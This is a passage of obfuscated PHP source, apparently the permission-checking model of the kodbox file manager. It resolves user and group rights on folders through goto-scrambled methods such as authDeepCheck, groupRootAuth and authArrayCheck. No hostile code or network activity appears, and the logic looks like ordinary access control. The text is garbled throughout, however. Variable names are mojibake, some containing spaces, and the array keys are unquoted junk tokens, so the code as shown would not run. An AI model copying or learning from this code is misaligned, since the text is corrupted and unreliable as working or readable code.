array_merge($D∫Ç°öÔΩ∞, array($AôëÖ“Úîò), array_reverse($b˘ß∑πì≈π)); } $D∫Ç°öÔΩ∞ = array_values(array_unique($D∫Ç°öÔΩ∞)); if (!$D∫Ç°öÔΩ∞) { return array(); } goto e≤ÛäÏï¡Ω; EÉåâÉÜ…≈: $d‡∆¢¿◊ºÉ =& $_SERVER[™⁄»üÆ]; if (!$e“‹ﬂ•È°) { return array(); } $BÃ˜πê›å = Model($d‡∆¢¿◊ºÉ[1214]); goto DÁ∏äÏ„ï∞; e≤ÛäÏï¡Ω: $Bí∑ÓÍÈîœ = $this->sourceAuthSelect($D∫Ç°öÔΩ∞); $dÖÔÆ∞Ñ„ = array(); foreach ($D∫Ç°öÔΩ∞ as $BüèÃ•€’¡) { if (isset($Bí∑ÓÍÈîœ[$BüèÃ•€’¡])) { $dÖÔÆ∞Ñ„[$BüèÃ•€’¡] = $Bí∑ÓÍÈîœ[$BüèÃ•€’¡]; } } goto DäÉ„ü√§æ; DäÉ„ü√§æ: $fƒøêü»õ∏ = $this->userIsRoot($Fã¯‚ê»ëî); $B√ü†ú«€‡ = AuthModel::authAll(); $eá∫àáÇ€÷ = array($d‡∆¢¿◊ºÉ[408] => $B√ü†ú«€‡, $d‡∆¢¿◊ºÉ[1886] => array($d‡∆¢¿◊ºÉ[413] => 0, $d‡∆¢¿◊ºÉ[1712] => $B√ü†ú«€‡, $d‡∆¢¿◊ºÉ[414] => LNG($d‡∆¢¿◊ºÉ[1887]), $d‡∆¢¿◊ºÉ[1728] => $d‡∆¢¿◊ºÉ[1888])); goto a‡Âòììµë; DÜ≤ï‰£õÙ: } public function authDeepCheck($dê¶ãßØ‰«, $CßÜ›∞∂é¿ = false) { goto cÊ¡òãâÏ‰; cÊ¡òãâÏ‰: $B†“¡Ü“ñ’ =& $_SERVER[™⁄»üÆ]; $CßÜ›∞∂é¿ = $CßÜ›∞∂é¿ ? $CßÜ›∞∂é¿ : USER_ID; $fø‡êÇ™Ú  = $this->makeAuthDeep($CßÜ›∞∂é¿); goto e€®ô¿Ö¶Ç; e€®ô¿Ö¶Ç: if (!in_array($dê¶ãßØ‰«, $fø‡êÇ™Ú [$B†“¡Ü“ñ’[1889]])) { return !1; } $d∏É—êÊäΩ = array(); foreach ($fø‡êÇ™Ú [$B†“¡Ü“ñ’[1890]] as $eç«¨ÚØ†ﬂ => $cÜ–«å÷«À) { if (!in_array($dê¶ãßØ‰«, $cÜ–«å÷«À)) { continue; } $d∏É—êÊäΩ[] = $eç«¨ÚØ†ﬂ; } goto a≈ÑÑãÑæÏ; a≈ÑÑãÑæÏ: if (!$d∏É—êÊäΩ) { return !1; } $A√€∏ü»ÙØ = $d∏É—êÊäΩ ? $d∏É—êÊäΩ[0] : $dê¶ãßØ‰«; return array($B†“¡Ü“ñ’[408] => -1, $B†“¡Ü“ñ’[447] => array($B†“¡Ü“ñ’[413] => $B†“¡Ü“ñ’[1093], $B†“¡Ü“ñ’[1712] => $B†“¡Ü“ñ’[191], $B†“¡Ü“ñ’[414] => LNG($B†“¡Ü“ñ’[1891]), $B†“¡Ü“ñ’[1728] => $B†“¡Ü“ñ’[1892]), $B†“¡Ü“ñ’[1893] => LNG($B†“¡Ü“ñ’[1894]), $B†“¡Ü“ñ’[1895] => $this->sourceAuthInfo($A√€∏ü»ÙØ)); goto f±‚∑ó¯ó; f±‚∑ó¯ó: } protected function makeAuthDeep($f¯˜⁄Æ Ω» = false) { goto fªÇÑ££®â; d˘¬Î«ÔêÍ: foreach ($C°÷§◊ËÉë as $b·ã¬ïø¨í) { $F–ﬂú‡ü¶à = $fΩÆ«¯ÂÖØ->getInfo($b·ã¬ïø¨í); $bãı∂‡ÂåÉ[] = $F–ﬂú‡ü¶à[$CﬂÉâﬁ©ßê[85]][$CﬂÉâﬁ©ßê[396]]; $aàì∏∏íÁ˘[$b·ã¬ïø¨í] = $F–ﬂú‡ü¶à[$CﬂÉâﬁ©ßê[85]][$CﬂÉâﬁ©ßê[396]]; $B•§ººçÚ√[$b·ã¬ïø¨í] = $bû⁄Ã¶õñΩ->parentLevelArray($F–ﬂú‡ü¶à[$CﬂÉâﬁ©ßê[503]]); } foreach ($b‹Âõ™Úº» as $Dõü∆‹πôö => $C¿–ÚûÀ®ä) { $F…Ç€ôì§Û = $eüÉâú¥·ﬂ[$Dõü∆‹πôö]; if (!$F…Ç€ôì§Û || !$aàì∏∏íÁ˘[$F…Ç€ôì§Û]) { continue; } $e‘€õ€‰Üƒ = array(); foreach ($B•§ººçÚ√[$F…Ç€ôì§Û] as $b·ã¬ïø¨í) { $e‘€õ€‰Üƒ[] = $aàì∏∏íÁ˘[$b·ã¬ïø¨í]; } $b‹Âõ™Úº»[$Dõü∆‹πôö] = array_merge($e‘€õ€‰Üƒ, $C¿–ÚûÀ®ä); } $bãı∂‡ÂåÉ = array_values(array_unique($bãı∂‡ÂåÉ)); goto cÇÜèñ”ïè; c—ƒÍóÈÔÛ: $AéÓíÌ’Ñ = $C°÷§◊ËÉë; foreach ($AéÓíÌ’Ñ as $b·ã¬ïø¨í) { $F–ﬂú‡ü¶à = $fΩÆ«¯ÂÖØ->getInfo($b·ã¬ïø¨í); $e‰Óæ·∂ÿ‚ = $bû⁄Ã¶õñΩ->parentLevelArray($F–ﬂú‡ü¶à[$CﬂÉâﬁ©ßê[503]]); $C°÷§◊ËÉë = array_merge($C°÷§◊ËÉë, $e‰Óæ·∂ÿ‚); } $C°÷§◊ËÉë = array_values(array_unique($C°÷§◊ËÉë)); goto d˘¬Î«ÔêÍ; AÙÉ´ó√ôÈ: if ($D™„õıªÓ∞) { $fÛπ˜’ÜŒö = array(array($CﬂÉâﬁ©ßê[405] => SourceModel::TYPE_USER, $CﬂÉâﬁ©ßê[485] => $f¯˜⁄Æ Ω»), array($CﬂÉâﬁ©ßê[405] => SourceModel::TYPE_GROUP, $CﬂÉâﬁ©ßê[485] => array($CﬂÉâﬁ©ßê[412], $D™„õıªÓ∞)), $CﬂÉâﬁ©ßê[967] => $CﬂÉâﬁ©ßê[1798]); } $a…µôÈí˜Ú = $this->field($CﬂÉâﬁ©ßê[1897])->where($fÛπ˜’ÜŒö)->select(); $FÔéÓóÉëπ = array(); goto fá°¨⁄‘⁄™; FÜõí™⁄¡¿: $b‹Âõ™Úº» = array(); $eüÉâú¥·ﬂ = array(); $aàì∏∏íÁ˘ = array(); goto Fˆ¶Á‘Ñ›Ü; e™Ç≈–Íôº: foreach ($F∂–ÛôÌáÆ as $D‚ Öñÿµ†) { if ($D‚ Öñÿµ†[$CﬂÉâﬁ©ßê[407]] == 0 && $D‚ Öñÿµ†[$CﬂÉâﬁ©ßê[1727]] == $CﬂÉâﬁ©ßê[87]) { $cä…óÀáîå[] = $D‚ Öñÿµ†[$CﬂÉâﬁ©ßê[394]]; } } $D™„õıªÓ∞ = $this->userGroupParents($f¯˜⁄Æ Ω»); $fÛπ˜’ÜŒö = array($CﬂÉâﬁ©ßê[405] => SourceModel::TYPE_USER, $CﬂÉâﬁ©ßê[485] => $f¯˜⁄Æ Ω»); goto AÙÉ´ó√ôÈ; a≠∫Ñ§üÜô: if (isset($B‹‰¢Ωƒ≠ƒ[$f¯˜⁄Æ Ω»])) { return $B‹‰¢Ωƒ≠ƒ[$f¯˜⁄Æ Ω»]; } $F∂–ÛôÌáÆ = Model($CﬂÉâﬁ©ßê[1896])->listData(); $cä…óÀáîå = array(); goto e™Ç≈–Íôº; Fˆ¶Á‘Ñ›Ü: $B•§ººçÚ√ = array(); if ($FÔéÓóÉëπ) { $aΩ«∫©éøÊ = $bû⁄Ã¶õñΩ->where(array($CﬂÉâﬁ©ßê[396] => array($CﬂÉâﬁ©ßê[412], $FÔéÓóÉëπ)))->select(); foreach ($aΩ«∫©éøÊ as $B◊üœﬁèÑ¥) { $e‰Óæ·∂ÿ‚ = $bû⁄Ã¶õñΩ->parentLevelArray($B◊üœﬁèÑ¥[$CﬂÉâﬁ©ßê[503]]); $bãı∂‡ÂåÉ = array_merge($bãı∂‡ÂåÉ, $e‰Óæ·∂ÿ‚); $C°÷§◊ËÉë[] = $B◊üœﬁèÑ¥[$CﬂÉâﬁ©ßê[485]]; $b‹Âõ™Úº»[$B◊üœﬁèÑ¥[$CﬂÉâﬁ©ßê[396]]] = $e‰Óæ·∂ÿ‚; $eüÉâú¥·ﬂ[$B◊üœﬁèÑ¥[$CﬂÉâﬁ©ßê[396]]] = $B◊üœﬁèÑ¥[$CﬂÉâﬁ©ßê[485]]; } } $C°÷§◊ËÉë = array_values(array_unique($C°÷§◊ËÉë)); goto c—ƒÍóÈÔÛ; cÇÜèñ”ïè: $A†≥ã¥ÑÌ¡ = array($CﬂÉâﬁ©ßê[1889] => $bãı∂‡ÂåÉ, $CﬂÉâﬁ©ßê[1890] => $b‹Âõ™Úº»); $B‹‰¢Ωƒ≠ƒ[$f¯˜⁄Æ Ω»] = $A†≥ã¥ÑÌ¡; return $A†≥ã¥ÑÌ¡; goto D⁄∂Áß¿÷û; A“©‡…∑°ù: $C°÷§◊ËÉë = $D™„õıªÓ∞; $bû⁄Ã¶õñΩ = Model($CﬂÉâﬁ©ßê[1214]); $fΩÆ«¯ÂÖØ = Model($CﬂÉâﬁ©ßê[504]); goto FÜõí™⁄¡¿; fá°¨⁄‘⁄™: $B–æ≠¢èÁÔ = array_to_keyvalue_group($a…µôÈí˜Ú, $CﬂÉâﬁ©ßê[396]); foreach ($B–æ≠¢èÁÔ as $BÇëòœûŒÜ => $Eˆøï∂òé) { $F“„ı›çÎÏ = $this->authArrayCheck($Eˆøï∂òé, $f¯˜⁄Æ Ω»); if ($F“„ı›çÎÏ[$CﬂÉâﬁ©ßê[408]] > 0) { $FÔéÓóÉëπ[] = $BÇëòœûŒÜ . $CﬂÉâﬁ©ßê[33]; } } $bãı∂‡ÂåÉ = array(); goto A“©‡…∑°ù; fªÇÑ££®â: $CﬂÉâﬁ©ßê =& $_SERVER[™⁄»üÆ]; static $B‹‰¢Ωƒ≠ƒ = array(); $f¯˜⁄Æ Ω» = $f¯˜⁄Æ Ω» ? $f¯˜⁄Æ Ω» : USER_ID; goto a≠∫Ñ§üÜô; D⁄∂Áß¿÷û: } private function makeSourceAuth($eáâÖª≥≤ß, $c◊÷Ãµà¿°, $a‰´Ÿ∏‹Ü¶ = false) { goto Eãù®†ÏÑà; b√Õ◊§Ò⁄´: if (!$B‚¯∆—û À) { $d◊Ø«¶öÚ¯ = Model($cÎìßÇÃÆç[504])->getInfo($e–ß‚ü±˘í); $dáê¬⁄ÂÜ« = explode($cÎìßÇÃÆç[47], trim($d◊Ø«¶öÚ¯[$cÎìßÇÃÆç[503]], $cÎìßÇÃÆç[47])); $dáê¬⁄ÂÜ« = array_reverse($dáê¬⁄ÂÜ«); foreach ($dáê¬⁄ÂÜ« as $CÁó®…œ«ç) { if ($CÁó®…œ«ç == $cÎìßÇÃÆç[191] || $CÁó®…œ«ç == $E‰ãﬂ©å˘˘) { continue; } $a¨∂úÀ‡äß = $this->groupRootAuth($CÁó®…œ«ç, $a‰´Ÿ∏‹Ü¶); if (!$a¨∂úÀ‡äß) { continue; } $B‚¯∆—û À = $this->groupAuthInfo($a¨∂úÀ‡äß, $CÁó®…œ«ç); break; } } if (!$B‚¯∆—û À || $B‚¯∆—û À[$cÎìßÇÃÆç[408]] <= 0) { $Eƒõ†é‘§Ö = $this->authDeepCheck($eáâÖª≥≤ß[$cÎìßÇÃÆç[396]], $a‰´Ÿ∏‹Ü¶); if ($Eƒõ†é‘§Ö) { $B‚¯∆—û À = $Eƒõ†é‘§Ö; } } return $B‚¯∆—û À; goto Aâ¬ﬂçÉ≤è; f°ﬁÉé˘€–: $f≤ÁÕã⁄‘Î = Model($cÎìßÇÃÆç[1214])->parentLevelArray($eáâÖª≥≤ß[$cÎìßÇÃÆç[503]]); $f≤ÁÕã⁄‘Î = array_merge(array($eáâÖª≥≤ß[$cÎìßÇÃÆç[396]]), array_reverse($f≤ÁÕã⁄‘Î)); $B‚¯∆—û À = !1; goto AŸàò≠íÃç; A≥ı€ÁÙ´√: $DÉ∂ÿÆ‘ô« = $eáâÖª≥≤ß[$cÎìßÇÃÆç[405]] == SourceModel::TYPE_GROUP; $d´§¯å†Üâ = $DÉ∂ÿÆ‘ô« ? $this->groupRootAuth($e–ß‚ü±˘í, $a‰´Ÿ∏‹Ü¶) : !1; if ($d´§¯å†Üâ && Model($cÎìßÇÃÆç[489])->authCheckAction($d´§¯å†Üâ[$cÎìßÇÃÆç[407]], $cÎìßÇÃÆç[1726])) { return $this->groupAuthInfo($d´§¯å†Üâ, $e–ß‚ü±˘í); } goto f°ﬁÉé˘€–; AŸàò≠íÃç: foreach ($f≤ÁÕã⁄‘Î as $Dûœ™‡æ˘Ê) { if (!isset($c◊÷Ãµà¿°[$Dûœ™‡æ˘Ê])) { continue; } $a÷≥É†Œè≤ = $this->authMake($c◊÷Ãµà¿°[$Dûœ™‡æ˘Ê], $a‰´Ÿ∏‹Ü¶); if ($a÷≥É†Œè≤[$cÎìßÇÃÆç[447]]) { $B‚¯∆—û À = $a÷≥É†Œè≤; break; } } if (!$DÉ∂ÿÆ‘ô«) { return $B‚¯∆—û À; } if (!$B‚¯∆—û À && $d´§¯å†Üâ) { $B‚¯∆—û À = $this->groupAuthInfo($d´§¯å†Üâ, $e–ß‚ü±˘í); } goto b√Õ◊§Ò⁄´; Eãù®†ÏÑà: $cÎìßÇÃÆç =& $_SERVER[™⁄»üÆ]; $E‰ãﬂ©å˘˘ = $cÎìßÇÃÆç[87]; $e–ß‚ü±˘í = $eáâÖª≥≤ß[$cÎìßÇÃÆç[485]]; goto A≥ı€ÁÙ´√; Aâ¬ﬂçÉ≤è: } private function userIsRoot($døÉ»©ŒÌ‡ = false) { $aıœ»ŸË¡È =& $_SERVER[™⁄»üÆ]; if (!$døÉ»©ŒÌ‡ && _get($GLOBALS, $aıœ»ŸË¡È[486])) { return !0; } $AÆ êÆáŸ· = Model($aıœ»ŸË¡È[520])->getInfo($døÉ»©ŒÌ‡); $dÂâÛˆÏπ— = Model($aıœ»ŸË¡È[1898])->listData($AÆ êÆáŸ·[$aıœ»ŸË¡È[1420]]); if ($dÂâÛˆÏπ— && $dÂâÛˆÏπ—[$aıœ»ŸË¡È[493]][$aıœ»ŸË¡È[1899]] == 1) { return !0; } return !1; } private function sourceAuthInfo($a©”õ◊”“á) { goto dπÌ„›€±; dπÌ„›€±: $cÎÆÙ¨ú∫ï =& $_SERVER[™⁄»üÆ]; $BŸ¢ÿ ”„ = Model($cÎÆÙ¨ú∫ï[1214]); $D”Á∞ß¥∆§ = $BŸ¢ÿ ”„->sourceInfo($a©”õ◊”“á); goto Bé≈ßœ˘∏ß; B◊÷Ñì™êÔ: if (isset($D”Á∞ß¥∆§[$cÎÆÙ¨ú∫ï[509]])) { $fî•Ãûøàô = explode($cÎÆÙ¨ú∫ï[8], trim($D”Á∞ß¥∆§[$cÎÆÙ¨ú∫ï[501]], $cÎÆÙ¨ú∫ï[8])); array_shift($fî•Ãûøàô); $F»™ñÆŸ®¬ = $D”Á∞ß¥∆§[$cÎÆÙ¨ú∫ï[507]] . $cÎÆÙ¨ú∫ï[1900] . implode($cÎÆÙ¨ú∫ï[8], $fî•Ãûøàô); } return array($cÎÆÙ¨ú∫ï[414] => $D”Á∞ß¥∆§[$cÎÆÙ¨ú∫ï[28]], $cÎÆÙ¨ú∫ï[76] => KodIO::make($D”Á∞ß¥∆§[$cÎÆÙ¨ú∫ï[396]]), $cÎÆÙ¨ú∫ï[1901] => $F»™ñÆŸ®¬); goto dü∂–£ßÖé; Bé≈ßœ˘∏ß: if (!$D”Á∞ß¥∆§) { return !1; } $BŸ¢ÿ ”„->groupPathDisplay($D”Á∞ß¥∆§); $fê◊◊ì˘êÁ = array($D”Á∞ß¥∆§); goto Eó≈ΩÃ¨…Ü; Eó≈ΩÃ¨…Ü: $fê◊◊ì˘êÁ = $BŸ¢ÿ ”„->_listAppendPath($fê◊◊ì˘êÁ); $D”Á∞ß¥∆§ = $fê◊◊ì˘êÁ[0]; $F»™ñÆŸ®¬ = $D”Á∞ß¥∆§[$cÎÆÙ¨ú∫ï[501]]; goto B◊÷Ñì™êÔ; dü∂–£ßÖé: } private function groupAuthInfo($Aù±¨ËƒÎø, $B‡ˆ†È©Ü) { $DÍÈíæ ·¯ =& $_SERVER[™⁄»üÆ]; $AÇÆ®⁄¨ôâ = Model($DÍÈíæ ·¯[504])->getInfo($B‡ˆ†È©Ü); return array($DÍÈíæ ·¯[1902] => intval($Aù±¨ËƒÎø[$DÍÈíæ ·¯[407]]), $DÍÈíæ ·¯[1886] => $Aù±¨ËƒÎø, $DÍÈíæ ·¯[1903] => LNG($DÍÈíæ ·¯[1904]), $DÍÈíæ ·¯[1895] => array($DÍÈíæ ·¯[414] => $AÇÆ®⁄¨ôâ[$DÍÈíæ ·¯[28]], $DÍÈíæ ·¯[76] => KodIO::make($AÇÆ®⁄¨ôâ[$DÍÈíæ ·¯[85]][$DÍÈíæ ·¯[396]]), $DÍÈíæ ·¯[1901] => $AÇÆ®⁄¨ôâ[$DÍÈíæ ·¯[508]])); } protected function groupRootAuth($AÖíπù¨‘◊, $CÌÙãîËÇ“ = false) { goto dòé ı†˘À; BÜÖªìÁÕ«: $f’ÜÖÓΩáÏ = $this->sourceAuthSelect($A¬µºãÁ˜⁄[$Fßöô›€ãá[85]][$Fßöô›€ãá[396]]); $e·‘õÖÍöÁ = $f’ÜÖÓΩáÏ ? $this->authMake($f’ÜÖÓΩáÏ, $CÌÙãîËÇ“) : !1; $EúààΩÍµ™ = $e·‘õÖÍöÁ ? $e·‘õÖÍöÁ[$Fßöô›€ãá[447]] : !1; goto BêÀ©∏áÈì; dƒöæ¡èç≈: $cùÛ∂ºâÿ≥ = $this->userGroupList($CÌÙãîËÇ“); $dÆÂ’Èè›Ê = isset($cùÛ∂ºâÿ≥[$AÖíπù¨‘◊]) ? $cùÛ∂ºâÿ≥[$AÖíπù¨‘◊][$Fßöô›€ãá[407]] : !1; if ($dÆÂ’Èè›Ê && Model($Fßöô›€ãá[489])->authCheckAction($dÆÂ’Èè›Ê[$Fßöô›€ãá[407]], $Fßöô›€ãá[1726])) { $f∆•°£ûüö[$dÉíºÊ†ø„] = $dÆÂ’Èè›Ê; return $dÆÂ’Èè›Ê; } goto BÜÖªìÁÕ«; dòé ı†˘À: $Fßöô›€ãá =& $_SERVER[™⁄»üÆ]; $CÌÙãîËÇ“ = $CÌÙãîËÇ“ ? $CÌÙãîËÇ“ : USER_ID; $dÉíºÊ†ø„ = $CÌÙãîËÇ“ . $Fßöô›€ãá[1905] . $AÖíπù¨‘◊; goto B¿˜Î∞À¯á; BêÀ©∏áÈì: $f∆•°£ûüö[$dÉíºÊ†ø„] = $EúààΩÍµ™ ? $EúààΩÍµ™ : $dÆÂ’Èè›Ê; return $f∆•°£ûüö[$dÉíºÊ†ø„]; goto cÑé©Û©∑ô; B¿˜Î∞À¯á: static $f∆•°£ûüö = array(); if (isset($f∆•°£ûüö[$dÉíºÊ†ø„])) { return $f∆•°£ûüö[$dÉíºÊ†ø„]; } $A¬µºãÁ˜⁄ = Model($Fßöô›€ãá[504])->getInfo($AÖíπù¨‘◊); goto dƒöæ¡èç≈; cÑé©Û©∑ô: } public function authOwnerApply($eÏÌÊ∏Áµº) { goto Bâç©¶åäâ; C…‘≈◊Ÿè«: $aªèˆ¨ Ü‘ = array(); $bö€çı Ûó = array(); foreach ($E÷±âé¢‰∑ as $c⁄‰íå°êŸ => $bââü’¯¨) { $CÑï◊Ö·ãë = $this->authFolderOwnerUser($bââü’¯¨); $aªèˆ¨ Ü‘[$c⁄‰íå°êŸ] = $CÑï◊Ö·ãë; $bö€çı Ûó = array_merge($bö€çı Ûó, $CÑï◊Ö·ãë[$cœã◊≥Á†£[576]]); if ($CÑï◊Ö·ãë[$cœã◊≥Á†£[1907]]) { break; } } goto Cäì∫±îÚË; Bâç©¶åäâ: $cœã◊≥Á†£ =& $_SERVER[™⁄»üÆ]; if (empty($eÏÌÊ∏Áµº[$cœã◊≥Á†£[407]]) || isset($eÏÌÊ∏Áµº[$cœã◊≥Á†£[1906]]) && $eÏÌÊ∏Áµº[$cœã◊≥Á†£[1906]]) { return $eÏÌÊ∏Áµº; } if (AuthModel::authCheckRoot($eÏÌÊ∏Áµº[$cœã◊≥Á†£[407]][$cœã◊≥Á†£[408]])) { return $eÏÌÊ∏Áµº; } goto E∂ﬂï¡ó‰‹; E∂ﬂï¡ó‰‹: $FÏéÜ‹Ÿ≈ç = Model($cœã◊≥Á†£[1214])->parentLevelArray($eÏÌÊ∏Áµº[$cœã◊≥Á†£[503]]); $FÏéÜ‹Ÿ≈ç = array_merge(array($eÏÌÊ∏Áµº[$cœã◊≥Á†£[396]]), array_reverse($FÏéÜ‹Ÿ≈ç)); $E÷±âé¢‰∑ = $this->sourceAuthSelect($FÏéÜ‹Ÿ≈ç); goto C…‘≈◊Ÿè«; F‚Ó˘®ú÷: $eÏÌÊ∏Áµº[$cœã◊≥Á†£[407]][$cœã◊≥Á†£[1908]] = Model($cœã◊≥Á†£[495])->userListInfo($bö€çı Ûó); return $eÏÌÊ∏Áµº; goto f¶ûÍıß∆“; Cäì∫±îÚË: if (count($bö€çı Ûó) == 0) { $bö€çı Ûó = $this->authFolderOwnerGroup($eÏÌÊ∏Áµº[$cœã◊≥Á†£[485]]); } $bö€çı Ûó = array_unique($bö€çı Ûó); if (AuthModel::authCheckRoot($eÏÌÊ∏Áµº[$cœã◊≥Á†£[407]][$cœã◊≥Á†£[408]])) { $bö€çı Ûó[] = USER_ID; } goto F‚Ó˘®ú÷; f¶ûÍıß∆“: } private function authFolderOwnerGroup($aãéé¢´äÁ) { $dÖÿ˘ìñ˜ç =& $_SERVER[™⁄»üÆ]; $büÑùæÎòŸ = Model($dÖÿ˘ìñ˜ç[1792])->where(array($dÖÿ˘ìñ˜ç[1706] => $aãéé¢´äÁ))->select(); $e≈ÇÔ¢°ê÷ = array(); if (!$büÑùæÎòŸ) { return $e≈ÇÔ¢°ê÷; } foreach ($büÑùæÎòŸ as $d‰Ë»ŸçÈº) { $aÎΩÌÈ„¥Ì = $this->authInfo($d‰Ë»ŸçÈº); if (AuthModel::authCheckRoot($aÎΩÌÈ„¥Ì[$dÖÿ˘ìñ˜ç[407]])) { $e≈ÇÔ¢°ê÷[] = $d‰Ë»ŸçÈº[$dÖÿ˘ìñ˜ç[1537]]; } } return $e≈ÇÔ¢°ê÷; } private function authFolderOwnerUser($D’·ﬁá’°ı) { $a¨„çµ…⁄Á =& $_SERVER[™⁄»üÆ]; $a‹Ñ⁄Ö‹≥Â = array(); $céûøæÂ£Á = !1; foreach ($D’·ﬁá’°ı as $A§àäìÂ®) { $Cûéººüêˆ = $this->authInfo($A§àäìÂ®); if ($A§àäìÂ®[$a¨„çµ…⁄Á[485]] == $a¨„çµ…⁄Á[191]) { $céûøæÂ£Á = !0; } if ($A§àäìÂ®[$a¨„çµ…⁄Á[405]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($Cûéººüêˆ[$a¨„çµ…⁄Á[407]])) { $a‹Ñ⁄Ö‹≥Â[] = $A§àäìÂ®[$a¨„çµ…⁄Á[485]]; } } } return array($a¨„çµ…⁄Á[576] => $a‹Ñ⁄Ö‹≥Â, $a¨„çµ…⁄Á[1907] => $céûøæÂ£Á); } public function authMake($b˘éãºÕ›ı, $Béﬁâ◊áä = false) { $C´‚®ÛêÚ» =& $_SERVER[™⁄»üÆ]; $eÑ£àñÑä° = $this->authArrayCheck($b˘éãºÕ›ı, $Béﬁâ◊áä); if ($eÑ£àñÑä°[$C´‚®ÛêÚ»[1909]]) { $eÑ£àñÑä°[$C´‚®ÛêÚ»[1909]] = $this->sourceAuthInfo($eÑ£àñÑä°[$C´‚®ÛêÚ»[1909]]); } return $eÑ£àñÑä°; } public function authArrayCheck($CåπµÃõÖê, $c—˘‡ßøÊè = false) { goto fã£Íﬁ¢û⁄; fﬁ÷®åçı£: return $aÍøæ∏û´Ì; goto E»Ÿ‡ç˘…ç; c‹ààåçÙ•: $føﬁ≤µÉ¶“ = 0; $BÍ–”¯“∫Ì = 0; $C«ÕÛäÔ„Ü = 0; goto C·ßùÀç®ö; d–Øü•´‰ä: foreach ($CåπµÃõÖê as $eëÀå¡ˆ©ç) { $cáüﬂ––πè = $this->authInfo($eëÀå¡ˆ©ç); if (!$cáüﬂ––πè) { continue; } $A¶ÈëÚÖ¬º = $eëÀå¡ˆ©ç[$eÒﬁË®©êà[485]]; $fπèËõÕà = intval($cáüﬂ––πè[$eÒﬁË®©êà[407]]); if ($eëÀå¡ˆ©ç[$eÒﬁË®©êà[405]] == SourceModel::TYPE_USER && $A¶ÈëÚÖ¬º == $c—˘‡ßøÊè) { $føﬁ≤µÉ¶“ = !0; $C«ÕÛäÔ„Ü = $cáüﬂ––πè; $BÍ–”¯“∫Ì = $fπèËõÕà; } else { if ($eëÀå¡ˆ©ç[$eÒﬁË®©êà[405]] == SourceModel::TYPE_GROUP && $this->groupContainUser($A¶ÈëÚÖ¬º, $c—˘‡ßøÊè)) { $DøÑ¨‹¨Ì£ = !0; $b«§ˆ Ï´Ã = $this->groupStepToUserGroup($A¶ÈëÚÖ¬º, $c—˘‡ßøÊè); if ($b«§ˆ Ï´Ã < $F†ìﬁõà¶¯) { $F†ìﬁõà¶¯ = $b«§ˆ Ï´Ã; $FÀﬁ›ÃœÓ› = $fπèËõÕà; $B¨êˆ¥∞“€ = $cáüﬂ––πè; $aÔñ˘≠“öÁ = $A¶ÈëÚÖ¬º; } if ($b«§ˆ Ï´Ã == $F†ìﬁõà¶¯ && $fπèËõÕà >= $FÀﬁ›ÃœÓ›) { $FÀﬁ›ÃœÓ› = $fπèËõÕà; $B¨êˆ¥∞“€ = $cáüﬂ––πè; $aÔñ˘≠“öÁ = $A¶ÈëÚÖ¬º; } } else { if ($A¶ÈëÚÖ¬º == $eÒﬁË®©êà[191]) { $a”¬£Ω¯ãÏ = !0; $BêéÓÖöÑŸ = $cáüﬂ––πè; $bé≈¶»©“‰ = $fπèËõÕà; } } } } if ($føﬁ≤µÉ¶“) { $aÚìû∏Õ∑ƒ = $BÍ–”¯“∫Ì; $cáüﬂ––πè = $C«ÕÛäÔ„Ü; $fê«ÊÌœãÂ = LNG($eÒﬁË®©êà[1910]); } else { if ($DøÑ¨‹¨Ì£) { $aÚìû∏Õ∑ƒ = $FÀﬁ›ÃœÓ›; $cáüﬂ––πè = $B¨êˆ¥∞“€; $Eıµ–úΩ„™ = Model($eÒﬁË®©êà[504])->getInfo($aÔñ˘≠“öÁ); $fê«ÊÌœãÂ = $eÒﬁË®©êà[160] . $Eıµ–úΩ„™[$eÒﬁË®©êà[508]] . $eÒﬁË®©êà[1911] . LNG($eÒﬁË®©êà[1912]); } else { if ($a”¬£Ω¯ãÏ) { $aÚìû∏Õ∑ƒ = $bé≈¶»©“‰; $cáüﬂ––πè = $BêéÓÖöÑŸ; $fê«ÊÌœãÂ = LNG($eÒﬁË®©êà[1883]); } else { $aÚìû∏Õ∑ƒ = 0; $cáüﬂ––πè = !1; $fê«ÊÌœãÂ = $eÒﬁË®©êà[33]; } } } $aÍøæ∏û´Ì = array($eÒﬁË®©êà[1902] => intval($aÚìû∏Õ∑ƒ), $eÒﬁË®©êà[1886] => $cáüﬂ––πè, $eÒﬁË®©êà[1903] => $fê«ÊÌœãÂ, $eÒﬁË®©êà[1895] => $eëÀå¡ˆ©ç[$eÒﬁË®©êà[396]]); goto fﬁ÷®åçı£; A¡’éá∑ÈÒ: $F†ìﬁõà¶¯ = 1000; $aÔñ˘≠“öÁ = 0; $a”¬£Ω¯ãÏ = 0; goto fÀô⁄”ÓÂÑ; C·ßùÀç®ö: $DøÑ¨‹¨Ì£ = 0; $FÀﬁ›ÃœÓ› = 0; $B¨êˆ¥∞“€ = 0; goto A¡’éá∑ÈÒ; fã£Íﬁ¢û⁄: $eÒﬁË®©êà =& $_SERVER[™⁄»üÆ]; if (!$CåπµÃõÖê) { return array($eÒﬁË®©êà[408] => 0, $eÒﬁË®©êà[447] => !1); } $c—˘‡ßøÊè = $c—˘‡ßøÊè ? $c—˘‡ßøÊè : USER_ID; goto c‹ààåçÙ•; fÀô⁄”ÓÂÑ: $bé≈¶»©“‰ = 0; $BêéÓÖöÑŸ = 0; $eëÀå¡ˆ©ç = array($eÒﬁË®©êà[396] => 0); goto d–Øü•´‰ä; E»Ÿ‡ç˘…ç: } private function groupContainUser($f¿ôÍÀŸ≠≤, $CÑﬁ≈ãëîÉ = false) { return in_array($f¿ôÍÀŸ≠≤, $this->userGroupParents($CÑﬁ≈ãëîÉ)); } private function groupStepToUserGroup($eìéü∏ÆÈ∂, $b˘«•©€ÉÆ = false) { goto cØ·⁄êﬂç™; A§ñ›Øíåï: return $E¨≤ÙˆÕ¨á; goto dàá÷¢¥¬“; e≤é¥î≈¥ê: $cﬂâﬁà¬ë = $GLOBALS[$aÙÊÍåÀΩ€[6]][$aÙÊÍåÀΩ€[88]][$aÙÊÍåÀΩ€[1803]] == 1; $Eç“âãˆ√∂ = $cﬂâﬁà¬ë ? 3 : 2; foreach ($C¿ı§ï¶ÀÔ as $f∫íÌÎ¥Öí) { if ($f∫íÌÎ¥Öí[$aÙÊÍåÀΩ€[1706]] == $eìéü∏ÆÈ∂) { return 0; } $cœ¡…¡¢àü = explode($aÙÊÍåÀΩ€[47], trim($f∫íÌÎ¥Öí[$aÙÊÍåÀΩ€[503]], $aÙÊÍåÀΩ€[47])); if ($cœ¡…¡¢àü[0] == $aÙÊÍåÀΩ€[191] && count($cœ¡…¡¢àü) > 